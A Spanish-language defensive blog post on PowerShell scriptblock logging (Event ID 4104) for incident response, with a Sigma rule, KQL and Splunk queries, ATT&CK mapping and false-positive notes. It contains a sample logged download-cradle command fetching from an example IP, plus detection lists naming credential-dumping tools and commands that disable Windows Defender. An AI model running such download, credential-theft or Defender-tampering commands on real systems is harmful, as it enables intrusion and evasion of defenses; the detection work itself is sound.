---
title: "PowerShell Event ID 4104 explicado: logging de scriptblock para DFIR"
description: "El logging de scriptblock es el control defensivo gratuito más útil de Windows. Registra el cuerpo completo del script — incluyendo los ofuscados o en memoria — bajo el evento 4104."
date: "2026-05-17"
---

Cuando el logging de scriptblock de PowerShell está habilitado, el motor registra el cuerpo de cada script que se ejecuta — comandos interactivos, scripts cargados desde disco, y cualquier cosa reflejada en memoria por `Invoke-Expression` o `IEX`. El registro aterriza en el [canal](/es/blog/what-is-an-evtx-file) `Microsoft-Windows-PowerShell/Operational` como Event ID **4104**, «Creating Scriptblock text».

## Qué obtienes

```xml
<Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">$wc = New-Object Net.WebClient; $wc.DownloadString('http://203.0.113.5/a')</Data>
<Data Name="ScriptBlockId">{guid}</Data>
<Data Name="Path">C:\Users\alice\Downloads\setup.ps1</Data>
```

Para un script largo PowerShell lo divide en múltiples registros 4104 (uno por número de mensaje). Volver a unirlos es esencial — los fragmentos son fáciles de mal leer.

## Cómo encenderlo

El ajuste es `HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging = 1`, equivalente a la Group Policy en *Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell → Turn on PowerShell Script Block Logging*. No hay coste por el lado de PowerShell digno de medirse — actívalo en todos sitios.

## Lo que captura que ninguna otra cosa hace

El motor de PowerShell registra el script **después** de cualquier codificación, compresión o reflexión en memoria. Eso significa:

- Una invocación `-EncodedCommand` registra tanto el lanzador codificado (en el ProcessCreate / 4688 correspondiente) como el cuerpo decodificado (en 4104).
- Un script que descarga y hace `Invoke-Expression` de un payload remoto registra el cuerpo *ejecutado*, no el wrapper.
- Un atacante usando bypasses AMSI aún deja el registro 4104 — el bypass afecta al escaneo, no al logging.

Este es el único control defensivo gratuito más útil de la plataforma. Los defensores que no tienen EDR usualmente tienen esto.

## Triage de 4104 a escala

Los patrones de alta señal en un corpus de registros 4104:

- `DownloadString`, `DownloadFile`, `Invoke-WebRequest`, `Net.WebClient` — fetch de contenido remoto.
- `IEX`, `Invoke-Expression` — ejecución dinámica.
- `FromBase64String`, `[System.Convert]::FromBase64String` — payload codificado.
- `Add-MpPreference -ExclusionPath` — tampering de Defender.
- `Set-MpPreference -DisableRealtimeMonitoring` — tampering de Defender.
- `[System.Reflection.Assembly]::Load`, `[Reflection.Emit]` — carga de assembly en memoria.
- `Invoke-Mimikatz`, `Invoke-Kerberoast`, `Invoke-BloodHound` — herramientas ofensivas conocidas.

Una sola coincidencia por sí sola no siempre es maliciosa (los admins también usan `DownloadString`), pero las combinaciones sí lo son. Pivota de 4104 al [evento Sysmon 1](/es/blog/sysmon-event-id-1-process-create) / 4688 correspondiente por timestamp + proceso para recuperar el contexto completo de invocación.

## Regla Sigma de ejemplo — herramientas ofensivas de PowerShell en scriptblock

```yaml
title: Suspicious PowerShell Scriptblock — Offensive Tool Indicators
id: 4f1a3b8d-2c5e-4d8f-9a3b-1c2d3e4f5a6b
status: stable
description: PowerShell scriptblock body contains strings characteristic of offensive tooling, encoded payloads, or in-memory reflection.
references:
  - https://attack.mitre.org/techniques/T1059/001/
  - https://attack.mitre.org/techniques/T1027/
logsource:
  product: windows
  service: powershell
  category: ps_script
detection:
  selection_offensive:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Invoke-Mimikatz'
      - 'Invoke-Kerberoast'
      - 'Invoke-BloodHound'
      - 'Invoke-DCSync'
      - 'New-PSInjection'
      - 'Get-PassHashes'
  selection_reflective:
    EventID: 4104
    ScriptBlockText|contains:
      - 'System.Reflection.Assembly]::Load'
      - '[Reflection.Emit]'
      - 'FromBase64String'
  selection_defender_tamper:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Set-MpPreference -DisableRealtimeMonitoring'
      - 'Add-MpPreference -ExclusionPath'
      - 'Set-MpPreference -DisableIOAVProtection'
  condition: selection_offensive or selection_reflective or selection_defender_tamper
falsepositives:
  - Defenders running known offensive tooling for testing (whitelist by host)
  - Software installers using reflection for legitimate purposes
level: high
tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense_evasion
```

## KQL de ejemplo — PowerShell codificado desde un usuario de bajo privilegio

```kusto
let encoded =
    Event
    | where Source == "Microsoft-Windows-PowerShell" and EventID == 4104
    | extend XmlData = parse_xml(EventData)
    | extend ScriptBlockText = tostring(XmlData.EventData.Data[2])
    | where ScriptBlockText contains "FromBase64String"
       or ScriptBlockText matches regex @"\b-e(?:nc|ncodedcommand)?\b\s"
    | project TimeGenerated, Computer, UserId=tostring(XmlData.System.Security["@UserID"]), ScriptBlockText;
encoded
| where UserId !startswith "S-1-5-18"   // exclude LocalSystem
   and UserId !startswith "S-1-5-19"
   and UserId !startswith "S-1-5-20"
| order by TimeGenerated desc
```

## Splunk de ejemplo — tampering de Defender desde PowerShell

```spl
index=powershell EventCode=4104
   ( ScriptBlockText="*Set-MpPreference*DisableRealtimeMonitoring*"
     OR ScriptBlockText="*Add-MpPreference*ExclusionPath*"
     OR ScriptBlockText="*Set-MpPreference*DisableIOAVProtection*" )
| table _time host UserID ScriptBlockText
```

## Mapeo ATT&CK

- **T1059.001 — Command and Scripting Interpreter: PowerShell**: cada 4104 ofensivo mapea aquí. PowerShell es una de las técnicas de ejecución más citadas en intrusiones modernas.
- **T1027 — Obfuscated Files or Information**: patrones codificados / Base64 / `FromBase64String`.
- **T1059.001 + T1140 — Deobfuscate/Decode Files or Information**: el motor registra la forma *decodificada*, que es el valor que 4104 aporta sobre [4688](/es/blog/event-id-4688-process-creation).
- **T1562.001 — Impair Defenses: Disable or Modify Tools**: `Set-MpPreference -DisableRealtimeMonitoring`, `Add-MpPreference -ExclusionPath`.
- **T1003.001 — OS Credential Dumping: LSASS Memory**: `Invoke-Mimikatz`, `MiniDump`, patrones `comsvcs.dll` en cuerpos de script.
- **T1558.003 — Kerberoasting**: patrones `Invoke-Kerberoast`, `Rubeus kerberoast`.

## Falsos positivos que parecen exactamente ataques

- **Runbooks de admin** a veces usan `Invoke-Expression` legítimamente para configuración templatizada. La combinación suele ser corta, repetible y desde sesiones de admin conocidas.
- **Scripts de gestión de Defender** (IT corporativo) llaman a `Set-MpPreference` legítimamente para empujar listas de exclusión. Whiteliste por el certificado de firma del script o SID del host.
- **Instaladores de Chocolatey / WinGet / paquetes** usan PowerShell codificado en Base64 legítimamente. Patrón: corto, diurno, desde hosts de build/admin.
- **Actividad red-team / pentest** parecerá idéntica a ataques reales. Coordina ventanas de engagement y etiqueta las IPs de origen del operador.

## El punto ciego

4104 registra el cuerpo del *script*. No registra ejecución por declaración, retornos de funciones, o valores de variables. Para eso necesitas transcripción (evento 4103, «Module logging») o un EDR real. 4104 te dice qué corrió; el resto te dice qué hizo.
